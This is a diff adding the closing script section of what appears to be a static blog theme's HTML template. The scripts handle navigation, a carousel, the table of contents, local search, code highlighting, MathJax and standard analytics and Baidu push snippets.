+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
